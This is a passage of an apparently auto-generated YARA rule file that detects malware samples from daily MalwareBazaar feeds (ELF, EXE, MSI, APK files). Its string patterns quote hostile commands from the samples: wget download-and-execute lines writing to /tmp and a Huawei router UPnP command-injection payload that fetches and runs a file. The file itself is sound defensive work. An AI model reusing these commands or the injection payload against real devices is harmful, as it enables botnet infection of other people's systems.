      hash1 = "206507792a57c90e8d1d4886b3032e2ab12732ee00703ba9b85a7316f38b3677"
      hash2 = "5ccf7e6168441fe093292f56d68a9186cdbc7b5c41615e5d27d39ac41dc61f24"
      hash3 = "6fdc8dc31ba2d6252353e7ef2e174018446469c94828bbba4ba02e11556e4867"
   strings:
      $s1 = "cd /tmp; wget http://%d.%d.%d.%d/%s; chmod 777 %s; ./%s %s.p3 &" fullword ascii
      $s2 = "cd /tmp; wget http://%d.%d.%d.%d/%s; chmod 777 %s; ./%s %s.p2" fullword ascii
      $s3 = "cd /tmp; wget http://%d.%d.%d.%d/%s; chmod 777 %s; ./%s %s.p1" fullword ascii
      $s4 = "wget http://%d.%d.%d.%d/%s -O /tmp/%s; chmod 777 /tmp/%s; /tmp/%s %s.p4" fullword ascii
      $s5 = "crontab /tmp/crontab.tmp" fullword ascii
      $s6 = "sdwcrjw" fullword ascii
      $s7 = "pnubtoful" fullword ascii
      $s8 = "whpbucndl" fullword ascii
      $s9 = "cbinbc" fullword ascii
      $s10 = "torschpi" fullword ascii
      $s11 = "tbkaubw" fullword ascii
      $s12 = "nidhuubds" fullword ascii
      $s13 = "idhuubds" fullword ascii
      $s14 = "niqfknc" fullword ascii
      $s15 = "tsufdb" fullword ascii
      $s16 = "wuhcIhcb76" fullword ascii
      $s17 = "bifekb" fullword ascii
      $s18 = "\\TbuqndbZ" fullword ascii
      $s19 = "ubehhs" fullword ascii
      $s20 = "\\NitsfkkZ" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _100406a9da5c039f752afa40a136f6e03cd6fe9d8c2d9f1c47362e4dddc263cb_87374fe6088ffe47d90d6de599aeeb8784ef0334c6d159fdeec2df3a2f_14 {
   meta:
      description = "evidences - from files 100406a9da5c039f752afa40a136f6e03cd6fe9d8c2d9f1c47362e4dddc263cb.exe, 87374fe6088ffe47d90d6de599aeeb8784ef0334c6d159fdeec2df3a2f92d9ba.exe, ff2284b9e11c03d98b7f91f037fedc26c38e54fa89a278c44057a827a3bb44d1.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "100406a9da5c039f752afa40a136f6e03cd6fe9d8c2d9f1c47362e4dddc263cb"
      hash2 = "87374fe6088ffe47d90d6de599aeeb8784ef0334c6d159fdeec2df3a2f92d9ba"
      hash3 = "ff2284b9e11c03d98b7f91f037fedc26c38e54fa89a278c44057a827a3bb44d1"
   strings:
      $s1 = "VCRUNTIME140_1.dll" fullword ascii
      $s2 = "__CxxFrameHandler4" fullword ascii
      $s3 = "vector too long" fullword ascii
      $s4 = "server" fullword ascii /* Goodware String - occured 401 times */
      $s5 = " A_A]_^[" fullword ascii
      $s6 = " A_A^^" fullword ascii
      $s7 = " A_A^A]A\\^" fullword ascii
      $s8 = " A^A]A\\^]" fullword ascii
      $s9 = " A_A^A]_[" fullword ascii
      $s10 = "@UWAVAW" fullword ascii /* Goodware String - occured 4 times */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and ( all of them )
      ) or ( all of them )
}

rule _468ff3b01cb98f3bb68e99b07d04c29869abc2e5c4ba3b8f075658e6121d0cd4_5e404a3ac0f71c114f4a3a9f02d6fda1e37cc0872320499eefadfb8d95_15 {
   meta:
      description = "evidences - from files 468ff3b01cb98f3bb68e99b07d04c29869abc2e5c4ba3b8f075658e6121d0cd4.msi, 5e404a3ac0f71c114f4a3a9f02d6fda1e37cc0872320499eefadfb8d95abe8b9.exe, ce9fefe17a09e0bbac993faaa2093fd0fa7ddab215f11c9e22c353999d5af71c.exe, e16baa228ab77485f38b335510270943ab54df755bf72987ac229d819bb85401.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "468ff3b01cb98f3bb68e99b07d04c29869abc2e5c4ba3b8f075658e6121d0cd4"
      hash2 = "5e404a3ac0f71c114f4a3a9f02d6fda1e37cc0872320499eefadfb8d95abe8b9"
      hash3 = "ce9fefe17a09e0bbac993faaa2093fd0fa7ddab215f11c9e22c353999d5af71c"
      hash4 = "e16baa228ab77485f38b335510270943ab54df755bf72987ac229d819bb85401"
   strings:
      $s1 = " Type Descriptor'" fullword ascii
      $s2 = " Class Hierarchy Descriptor'" fullword ascii
      $s3 = " Base Class Descriptor at (" fullword ascii
      $s4 = " Complete Object Locator'" fullword ascii
      $s5 = " delete[]" fullword ascii
      $s6 = " delete" fullword ascii
      $s7 = " new[]" fullword ascii
      $s8 = " Base Class Array'" fullword ascii
   condition:
      ( ( uint16(0) == 0xcfd0 or uint16(0) == 0x5a4d ) and filesize < 28000KB and ( all of them )
      ) or ( all of them )
}

rule _100406a9da5c039f752afa40a136f6e03cd6fe9d8c2d9f1c47362e4dddc263cb_5e404a3ac0f71c114f4a3a9f02d6fda1e37cc0872320499eefadfb8d95_16 {
   meta:
      description = "evidences - from files 100406a9da5c039f752afa40a136f6e03cd6fe9d8c2d9f1c47362e4dddc263cb.exe, 5e404a3ac0f71c114f4a3a9f02d6fda1e37cc0872320499eefadfb8d95abe8b9.exe, 87374fe6088ffe47d90d6de599aeeb8784ef0334c6d159fdeec2df3a2f92d9ba.exe, ff2284b9e11c03d98b7f91f037fedc26c38e54fa89a278c44057a827a3bb44d1.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "100406a9da5c039f752afa40a136f6e03cd6fe9d8c2d9f1c47362e4dddc263cb"
      hash2 = "5e404a3ac0f71c114f4a3a9f02d6fda1e37cc0872320499eefadfb8d95abe8b9"
      hash3 = "87374fe6088ffe47d90d6de599aeeb8784ef0334c6d159fdeec2df3a2f92d9ba"
      hash4 = "ff2284b9e11c03d98b7f91f037fedc26c38e54fa89a278c44057a827a3bb44d1"
   strings:
      $s1 = " A_A^_" fullword ascii
      $s2 = " A_A^A\\" fullword ascii
      $s3 = " A_A^]" fullword ascii
      $s4 = " A_A^_^]" fullword ascii
      $s5 = " A_A^A]A\\_^]" fullword ascii
      $s6 = " A_A^A]A\\_" fullword ascii
      $s7 = " A_A^A\\_^" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and ( all of them )
      ) or ( all of them )
}

rule _100406a9da5c039f752afa40a136f6e03cd6fe9d8c2d9f1c47362e4dddc263cb_5e404a3ac0f71c114f4a3a9f02d6fda1e37cc0872320499eefadfb8d95_17 {
   meta:
      description = "evidences - from files 100406a9da5c039f752afa40a136f6e03cd6fe9d8c2d9f1c47362e4dddc263cb.exe, 5e404a3ac0f71c114f4a3a9f02d6fda1e37cc0872320499eefadfb8d95abe8b9.exe, 87374fe6088ffe47d90d6de599aeeb8784ef0334c6d159fdeec2df3a2f92d9ba.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "100406a9da5c039f752afa40a136f6e03cd6fe9d8c2d9f1c47362e4dddc263cb"
      hash2 = "5e404a3ac0f71c114f4a3a9f02d6fda1e37cc0872320499eefadfb8d95abe8b9"
      hash3 = "87374fe6088ffe47d90d6de599aeeb8784ef0334c6d159fdeec2df3a2f92d9ba"
   strings:
      $s1 = " A_A^A]" fullword ascii
      $s2 = " A^A\\_" fullword ascii
      $s3 = " A_A^A]_^" fullword ascii
      $s4 = " A_A\\_" fullword ascii
      $s5 = " A^_^][" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 16000KB and ( all of them )
      ) or ( all of them )
}

rule _100406a9da5c039f752afa40a136f6e03cd6fe9d8c2d9f1c47362e4dddc263cb_4d3abd31ce845bf66671548917645ac0bc7c4f6a42127c782121669fe5_18 {
   meta:
      description = "evidences - from files 100406a9da5c039f752afa40a136f6e03cd6fe9d8c2d9f1c47362e4dddc263cb.exe, 4d3abd31ce845bf66671548917645ac0bc7c4f6a42127c782121669fe58d7630.elf, 87374fe6088ffe47d90d6de599aeeb8784ef0334c6d159fdeec2df3a2f92d9ba.exe, bf6846a1bf83a3da387f16bfca3f60064b2e4c94190337c0b034dfc491d8e2b2.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "100406a9da5c039f752afa40a136f6e03cd6fe9d8c2d9f1c47362e4dddc263cb"
      hash2 = "4d3abd31ce845bf66671548917645ac0bc7c4f6a42127c782121669fe58d7630"
      hash3 = "87374fe6088ffe47d90d6de599aeeb8784ef0334c6d159fdeec2df3a2f92d9ba"
      hash4 = "bf6846a1bf83a3da387f16bfca3f60064b2e4c94190337c0b034dfc491d8e2b2"
   strings:
      $s1 = "'#^QTy" fullword ascii /* Goodware String - occured 2 times */
      $s2 = "&`Pqy?" fullword ascii /* Goodware String - occured 2 times */
      $s3 = "IJ_H^[" fullword ascii /* Goodware String - occured 3 times */
      $s4 = "aaY8GG" fullword ascii
      $s5 = "mmZ7EEP" fullword ascii
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x457f ) and filesize < 28000KB and ( all of them )
      ) or ( all of them )
}

rule _0c1b7c2142c7eae7c7cd0324f00868336ec01eaa2f0a272169e1f775c371cfbf_50dad45e91f61043118a822c13316171108c676db874ab5cfc77f149a4_19 {
   meta:
      description = "evidences - from files 0c1b7c2142c7eae7c7cd0324f00868336ec01eaa2f0a272169e1f775c371cfbf.apk, 50dad45e91f61043118a822c13316171108c676db874ab5cfc77f149a41eba9f.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "0c1b7c2142c7eae7c7cd0324f00868336ec01eaa2f0a272169e1f775c371cfbf"
      hash2 = "50dad45e91f61043118a822c13316171108c676db874ab5cfc77f149a41eba9f"
   strings:
      $s1 = "_ZNSt16invalid_argumentD1Ev" fullword ascii /* Goodware String - occured 3 times */
      $s2 = "_ZNKSt13runtime_error4whatEv" fullword ascii /* Goodware String - occured 3 times */
      $s3 = "_ZTISt16invalid_argument" fullword ascii /* Goodware String - occured 3 times */
      $s4 = "_ZTVSt13runtime_error" fullword ascii /* Goodware String - occured 3 times */
      $s5 = "__cxa_free_exception" fullword ascii /* Goodware String - occured 3 times */
      $s6 = "_ZSt17current_exceptionv" fullword ascii /* Goodware String - occured 3 times */
      $s7 = "_ZTVN10__cxxabiv119__pointer_type_infoE" fullword ascii /* Goodware String - occured 3 times */
      $s8 = "_ZTVN10__cxxabiv120__function_type_infoE" fullword ascii /* Goodware String - occured 3 times */
      $s9 = "_ZTVSt11logic_error" fullword ascii /* Goodware String - occured 3 times */
      $s10 = "_ZTVSt16invalid_argument" fullword ascii /* Goodware String - occured 3 times */
      $s11 = "_ZNSt13runtime_errorD1Ev" fullword ascii /* Goodware String - occured 3 times */
      $s12 = "__cxa_guard_abort" fullword ascii /* Goodware String - occured 4 times */
      $s13 = "_ZSt9terminatev" fullword ascii /* Goodware String - occured 5 times */
   condition:
      ( ( uint16(0) == 0x4b50 or uint16(0) == 0x457f ) and filesize < 26000KB and ( 8 of them )
      ) or ( all of them )
}

rule _0df02e130512613f06d1ebbc6aff158ca514ff65806a7ca978cfb9cdbce76364_0f61988a48c814c8030ac8ba51dd7bbabd1dd39e019ffc8da6939932dd_20 {
   meta:
      description = "evidences - from files 0df02e130512613f06d1ebbc6aff158ca514ff65806a7ca978cfb9cdbce76364.msi, 0f61988a48c814c8030ac8ba51dd7bbabd1dd39e019ffc8da6939932dd8d3217.msi, 48c55a1c602eb9775660ab39122d7214882bd8a2f5edfb7bd710d90520856418.msi, 4bdfb31b28824d39594d59721f46a5a0524ab52a943b63a218a2709436c0fe9b.msi, 5b0dfa8f066cbafde8f04e6d6f3f3290c5ee78c2209aa8c19e0cda32e8b64756.msi, 907df555680a7f883b8768c9c2e058002e938e41fbc267394a212337ac635bbb.msi, e16baa228ab77485f38b335510270943ab54df755bf72987ac229d819bb85401.msi, f5fee6a25203a847c92a0b30866ced1131a4962ba9e7353fc3dedb97d552bf4d.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "0df02e130512613f06d1ebbc6aff158ca514ff65806a7ca978cfb9cdbce76364"
      hash2 = "0f61988a48c814c8030ac8ba51dd7bbabd1dd39e019ffc8da6939932dd8d3217"
      hash3 = "48c55a1c602eb9775660ab39122d7214882bd8a2f5edfb7bd710d90520856418"
      hash4 = "4bdfb31b28824d39594d59721f46a5a0524ab52a943b63a218a2709436c0fe9b"
      hash5 = "5b0dfa8f066cbafde8f04e6d6f3f3290c5ee78c2209aa8c19e0cda32e8b64756"
      hash6 = "907df555680a7f883b8768c9c2e058002e938e41fbc267394a212337ac635bbb"
      hash7 = "e16baa228ab77485f38b335510270943ab54df755bf72987ac229d819bb85401"
      hash8 = "f5fee6a25203a847c92a0b30866ced1131a4962ba9e7353fc3dedb97d552bf4d"
   strings:
      $x1 = "on.AdminUISequenceAdvtExecuteSequenceBinaryUnique key identifying the binary data.DataThe unformatted binary data.ComponentPrima" ascii
      $s2 = "f columnAdminExecuteSequenceActionName of action to invoke, either in the engine or the handler DLL.ConditionOptional expression" ascii
      $s3 = "ry key used to identify a particular component record.ComponentIdGuidA string GUID unique to this component, version, and langua" ascii
      $s4 = "ode.TargetFormattedExcecution parameter, depends on the type of custom actionExtendedTypeA numeric custom action type that exten" ascii
      $s5 = "dActionData.SequenceNumber that determines the sort order in which the actions are to be executed.  Leave blank to suppress acti" ascii
      $s6 = ", Name of table to which data must linkColumn to which foreign key connectsText;Formatted;Template;Condition;Guid;Path;Version;L" ascii
      $s7 = "ature attributesFeatureComponentsFeature_Foreign key into Feature table.Component_Foreign key into Component table.FilePrimary k" ascii
      $s8 = ".TitleShort text identifying a visible feature item.Longer descriptive text describing a visible feature item.DisplayNumeric sor" ascii
      $s9 = " path, set either by the AppSearch action or with the default setting obtained from the Directory table.AttributesRemote executi" ascii
      $s10 = " to it.CustomActionPrimary key, name of action, normally appears in sequence table unless private use.The numeric custom action " ascii
      $s11 = "t sub-path under parent's path.FeaturePrimary key used to identify a particular feature record.Feature_ParentOptional key of a p" ascii
      $s12 = "IdentifierName of tableName of columnY;NWhether the column is nullableYMinimum value allowedMaximum value allowedFor foreign key" ascii
      $s13 = "ds code type or option flags of the Type column.Unique identifier for directory entry, primary key. If a property by this name i" ascii
      $s14 = "ey, non-localized token, must match identifier in cabinet.  For uncompressed files, this field is ignored.Foreign key referencin" ascii
      $s15 = "g Component that controls the file.FileNameFilenameFile name used for installation, may be localized.  This may contain a \"shor" ascii
      $s16 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s17 = "rue' state. If a component is disabled, it will not be installed, regardless of the 'Action' state associated with the component" ascii
      $s18 = ".KeyPathFile;Registry;ODBCDataSourceEither the primary key into the File table, Registry table, or ODBCDataSource table. This ex" ascii
      $s19 = "ge.Directory_DirectoryRequired key of a Directory table record. This is actually a property name whose value contains the actual" ascii
      $s20 = " name|long name\" pair.FileSizeSize of file in bytes (long integer).VersionVersion string for versioned files;  Blank for unvers" ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 27000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _137c48d491535f13d43eb8e441a25eb4e88b82741c8b506c1ffe8c09714100b9_144d1a465511f24a1db9d9651873c8ac851cc7820628edc389d8c48c30_21 {
   meta:
      description = "evidences - from files 137c48d491535f13d43eb8e441a25eb4e88b82741c8b506c1ffe8c09714100b9.elf, 144d1a465511f24a1db9d9651873c8ac851cc7820628edc389d8c48c3039e030.elf, 206507792a57c90e8d1d4886b3032e2ab12732ee00703ba9b85a7316f38b3677.elf, 3b004ef7eaf23f5cf52f6508362d1e4a2c5034570c8c1c2b60b2568c99302c66.elf, 4c74ea37369faa8c6b8bda4921b7b47b16c3eeae07aa099d7023c1fb80e32bcb.elf, 5ccf7e6168441fe093292f56d68a9186cdbc7b5c41615e5d27d39ac41dc61f24.elf, 6977df3439c1ca06794d591b3af31c2a4b6315c1cc8e90b6275e56c2e682c6dd.elf, 6fdc8dc31ba2d6252353e7ef2e174018446469c94828bbba4ba02e11556e4867.elf, 7164fa956d113903e4addc703914762107010acc9c3e69f0b3f970348521920d.elf, 88ce6e5523cea7f0cd90ad2d9e2f06c05a70297134c0400e04769e5a60d263b8.elf, b23dcc6497a813effc13c189df6c251399766754f1fc497c290c811d8133733c.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "137c48d491535f13d43eb8e441a25eb4e88b82741c8b506c1ffe8c09714100b9"
      hash2 = "144d1a465511f24a1db9d9651873c8ac851cc7820628edc389d8c48c3039e030"
      hash3 = "206507792a57c90e8d1d4886b3032e2ab12732ee00703ba9b85a7316f38b3677"
      hash4 = "3b004ef7eaf23f5cf52f6508362d1e4a2c5034570c8c1c2b60b2568c99302c66"
      hash5 = "4c74ea37369faa8c6b8bda4921b7b47b16c3eeae07aa099d7023c1fb80e32bcb"
      hash6 = "5ccf7e6168441fe093292f56d68a9186cdbc7b5c41615e5d27d39ac41dc61f24"
      hash7 = "6977df3439c1ca06794d591b3af31c2a4b6315c1cc8e90b6275e56c2e682c6dd"
      hash8 = "6fdc8dc31ba2d6252353e7ef2e174018446469c94828bbba4ba02e11556e4867"
      hash9 = "7164fa956d113903e4addc703914762107010acc9c3e69f0b3f970348521920d"
      hash10 = "88ce6e5523cea7f0cd90ad2d9e2f06c05a70297134c0400e04769e5a60d263b8"
      hash11 = "b23dcc6497a813effc13c189df6c251399766754f1fc497c290c811d8133733c"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s2 = "in/busybox wget -g %d.%d.%d.%d -l /tmp/.vs -r /h; /bin/busybox chmod 777 /tmp/.vs; /tmp/.vs; sh /tmp/.vs)</NewStatusURL><NewDown" ascii
      $s3 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" fullword ascii
      $s4 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1" fullword ascii
      $s5 = "g/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(rm -rf /tmp/*;" ascii
      $s6 = "HOST: 255.255.255.255:1900" fullword ascii
      $s7 = "service:service-agent" fullword ascii
      $s8 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s9 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s10 = "loadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii
      $s11 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s12 = "eviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a25" ascii
      $s13 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr" fullword ascii
      $s14 = "ST: urn:dial-multiscreen-org:service:dial:1" fullword ascii
      $s15 = "88645cefb1f9ede0e336e3569d75ee30" ascii
      $s16 = " default" fullword ascii
      $s17 = "Windows XP" fullword ascii /* Goodware String - occured 134 times */
      $s18 = "/proc/net/tcp" fullword ascii
      $s19 = "TeamSpeak" fullword ascii
      $s20 = "google" fullword ascii /* Goodware String - occured 1 times */
   condition:
      ( uint16(0) == 0x457f and filesize < 400KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _42854f517bd36eba51ee3dbf12c1537e74298b84fbcde9a612b02705a7f0fd81_df80b2553ed6b8f3f9f49b27b436bc19f3f29d8d12e6f9e9cbae5b1b77_22 {
   meta:
      description = "evidences - from files 42854f517bd36eba51ee3dbf12c1537e74298b84fbcde9a612b02705a7f0fd81.dll, df80b2553ed6b8f3f9f49b27b436bc19f3f29d8d12e6f9e9cbae5b1b77e7e844.img"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "42854f517bd36eba51ee3dbf12c1537e74298b84fbcde9a612b02705a7f0fd81"
      hash2 = "df80b2553ed6b8f3f9f49b27b436bc19f3f29d8d12e6f9e9cbae5b1b77e7e844"
   strings:
      $s1 = "CreateDecryptor" fullword ascii /* Goodware String - occured 76 times */
      $s2 = "System.Security.Cryptography" fullword ascii /* Goodware String - occured 305 times */
      $s3 = "EndInvoke" fullword ascii /* Goodware String - occured 915 times */
      $s4 = "BeginInvoke" fullword ascii /* Goodware String - occured 932 times */
      $s5 = "Monitor" fullword ascii /* Goodware String - occured 1015 times */
      $s6 = "callback" fullword ascii /* Goodware String - occured 1019 times */
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x0000 ) and filesize < 4000KB and ( all of them )
      ) or ( all of them )
}

rule _4d3abd31ce845bf66671548917645ac0bc7c4f6a42127c782121669fe58d7630_bf6846a1bf83a3da387f16bfca3f60064b2e4c94190337c0b034dfc491_23 {
   meta:
      description = "evidences - from files 4d3abd31ce845bf66671548917645ac0bc7c4f6a42127c782121669fe58d7630.elf, bf6846a1bf83a3da387f16bfca3f60064b2e4c94190337c0b034dfc491d8e2b2.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "4d3abd31ce845bf66671548917645ac0bc7c4f6a42127c782121669fe58d7630"
      hash2 = "bf6846a1bf83a3da387f16bfca3f60064b2e4c94190337c0b034dfc491d8e2b2"
   strings:
      $s1 = "t!&zc?/1" fullword ascii /* reversed goodware string '1/?cz&!t' */
      $s2 = "DOWNGRD" fullword ascii
      $s3 = "H%Mx7@.," fullword ascii /* Goodware String - occured 1 times */
      $s4 = "U^h6LU3" fullword ascii /* Goodware String - occured 1 times */
      $s5 = "HeS;JG" fullword ascii /* Goodware String - occured 1 times */
      $s6 = "=u8Q)+" fullword ascii /* Goodware String - occured 1 times */
      $s7 = "dISoy}h" fullword ascii /* Goodware String - occured 1 times */
      $s8 = "A:3,]VOHyrkd[[" fullword ascii
      $s9 = "r1hTsN" fullword ascii /* Goodware String - occured 1 times */
      $s10 = "client fI9" fullword ascii
      $s11 = "\"#+%?" fullword ascii /* Goodware String - occured 1 times */
      $s12 = "% Mqz<" fullword ascii /* Goodware String - occured 1 times */
      $s13 = "_kI;j]" fullword ascii /* Goodware String - occured 1 times */
      $s14 = "%k0V(" fullword ascii /* Goodware String - occured 3 times */
      $s15 = "s\\ax}?" fullword ascii /* Goodware String - occured 3 times */
      $s16 = "]jg]6g" fullword ascii
      $s17 = "fpd0R@=" fullword ascii
      $s18 = "KQUkqH" fullword ascii
      $s19 = "8@%rdi" fullword ascii
      $s20 = "%E3C;4" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 28000KB and ( 8 of them )
      ) or ( all of them )
}

rule _9f66791e3cbbdf307ee238f196a6063e942755f8fc28f0b8569050ef98e8281a_bfd5b53cfb37fcc03055a35554072fc03bd716ac511e6660d1a7f7d793_24 {
   meta:
      description = "evidences - from files 9f66791e3cbbdf307ee238f196a6063e942755f8fc28f0b8569050ef98e8281a.unknown, bfd5b53cfb37fcc03055a35554072fc03bd716ac511e6660d1a7f7d7934eddc9.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "9f66791e3cbbdf307ee238f196a6063e942755f8fc28f0b8569050ef98e8281a"
      hash2 = "bfd5b53cfb37fcc03055a35554072fc03bd716ac511e6660d1a7f7d7934eddc9"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                           ' */
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                 ' */
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 @  @            ' */
      $s4 = "DAAAAAAAAAAA" ascii /* base64 encoded string '        ' */
      $s5 = "HcwBHcwBHcwBHcwBHcwBHcwBHcwBHcwBHcwBHcwBHcwBHcwBHcwBHcwBHcwBHcwBHcwBHcwBHcwBHcwBHcwBHcwBHcwBHcwBHcwBHcwBHcwBHcwBHcwBHcwBHcwBHcwB" ascii /* base64 encoded string 's Gs Gs Gs Gs Gs Gs Gs Gs Gs Gs Gs Gs Gs Gs Gs Gs Gs Gs Gs Gs Gs Gs Gs Gs Gs Gs Gs Gs Gs Gs Gs ' */
      $s6 = "MzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMz" ascii /* base64 encoded string '333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333' */
      $s7 = "CAAAAAAAAAAA" ascii /* base64 encoded string '        ' */
      $s8 = "U/D0/w8PI/Dx/A8P8erTgDDu/Q7PwerTgDDr/g6PkerTgDDo/w5PYerTgDDl/A5PMerTgDDi/Q4PAerTgDDf/g3P09Dc/w2Po9DZ/A2Pc9DW/Q1PQ9DT/g0PE9DQ/wzP" ascii
      $s9 = "AAAABAAAAEAAAA" ascii
      $s10 = "AAAAAAAABAD" ascii
      $s11 = "AAAAAAAABAA" ascii
      $s12 = "AAAAAAAAABAAABAAAAA" ascii
      $s13 = "AAAAAAAAAAAAAAAAAAAEAAAE" ascii
      $s14 = "AAAAAAAAAAAEAAAA" ascii
      $s15 = "DAAAAAAAEA" ascii
      $s16 = "BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s17 = "AAAAAAAAAAAAE8" ascii
      $s18 = "AAAAAAAAAAe4" ascii
      $s19 = "AAAAAAAAAAAAAAAAAAAAEAAAAEAA4" ascii
      $s20 = "DAAAAAFAd8" ascii
   condition:
      ( ( uint16(0) == 0x413d or uint16(0) == 0x4141 ) and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _69a6060f1303b12e66489f40713d04fd052509d5b481054e578aa16589ca71fb_7f61f586fff2f9f61c6de189b58a026f1074b956f1ca31f9ba7278e073_25 {
   meta:
      description = "evidences - from files 69a6060f1303b12e66489f40713d04fd052509d5b481054e578aa16589ca71fb.unknown, 7f61f586fff2f9f61c6de189b58a026f1074b956f1ca31f9ba7278e0731ae98d.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "69a6060f1303b12e66489f40713d04fd052509d5b481054e578aa16589ca71fb"
      hash2 = "7f61f586fff2f9f61c6de189b58a026f1074b956f1ca31f9ba7278e0731ae98d"
   strings:
      $s1 = "AAAAAAAAAAAAAC" ascii /* base64 encoded string '          ' */
      $s2 = "ABAAABAAAAAAAAAAAAAAAAAA" ascii
      $s3 = "AAAAAAAAAAAAAEAAAAAAAAAABAA" ascii
      $s4 = "FAAAAEABAAAAC" ascii
      $s5 = "BAAAFAAAABAAA" ascii
      $s6 = "FAAAAAAABA" ascii
      $s7 = "EADAAAAAAA" ascii
      $s8 = "AAADAAAA8AABA" ascii
      $s9 = "C4BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s10 = "EBEAAF4AAA" ascii
      $s11 = "AAAAAAcEAAA" ascii
      $s12 = "4AADAAAAAA" ascii
      $s13 = "AA4AAAAADA" ascii
      $s14 = "EBAACAAAAAA" ascii
      $s15 = "BAACAAAAAA" ascii
      $s16 = "BAAAEAABAAAAAAAAAAAAAAAAAAAACAA" ascii
      $s17 = "CAAAAAABAAAAAAAAAAAAAAAAAAAAAAAACAAAAAABAAAAAAAAAAAAAAAAAAAACAA" ascii
      $s18 = "AAAACAAAAA" ascii
      $s19 = "BAAAEAABAAAAAAAAAAAAAAAAAAAACAA4AAAA" ascii
      $s20 = "EBAACAAAAAA7E" ascii
   condition:
      ( uint16(0) == 0x4141 and filesize < 100KB and ( 8 of them )
      ) or ( all of them )
}

rule _9c04d567492659d7a5344a9a64fe79f93d7b2063a9e6a1f21068023bd4f96af0_e09c72792e2f15b40c07327efbb0ece82c10e7538509a3301fd09188cf_26 {
   meta:
      description = "evidences - from files 9c04d567492659d7a5344a9a64fe79f93d7b2063a9e6a1f21068023bd4f96af0.rar, e09c72792e2f15b40c07327efbb0ece82c10e7538509a3301fd09188cf8ab782.rar"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "9c04d567492659d7a5344a9a64fe79f93d7b2063a9e6a1f21068023bd4f96af0"
      hash2 = "e09c72792e2f15b40c07327efbb0ece82c10e7538509a3301fd09188cf8ab782"
   strings:
